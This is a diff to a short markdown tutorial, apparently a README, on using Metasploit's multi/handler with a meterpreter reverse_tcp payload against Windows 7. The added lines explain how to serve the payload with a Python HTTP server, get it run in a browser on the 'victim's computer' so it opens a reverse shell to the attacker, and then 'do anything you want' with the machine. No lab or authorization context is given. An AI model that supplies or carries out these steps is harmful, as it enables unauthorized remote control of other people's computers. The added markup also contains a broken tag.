@@ -13,11 +13,16 @@ OS Windows 7
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
 Configure the settings
-<pre>show options</pre>
+<pre>show options</pre> and <pre>exploit</pre
+
+#### 3. ITs necesary to execute the file on the victim's computer ####
+Use <code>python -m SimpleHTTPServer 80</code> to have an easy acces to your file wihtout the need of download it.
+Run your file through any browser on victim's computer using your IP and the connection should be established.
 
 
 Then do anything you want with the computer's victim, remember alway use:
->   <code>show options</code> to configure the settings  
+>   <code>show options</code> to configure the settings.  
+
 >   <code>background</code> to set the current session on background.
 
 >   <code>sessions</code> list all the active sessions.
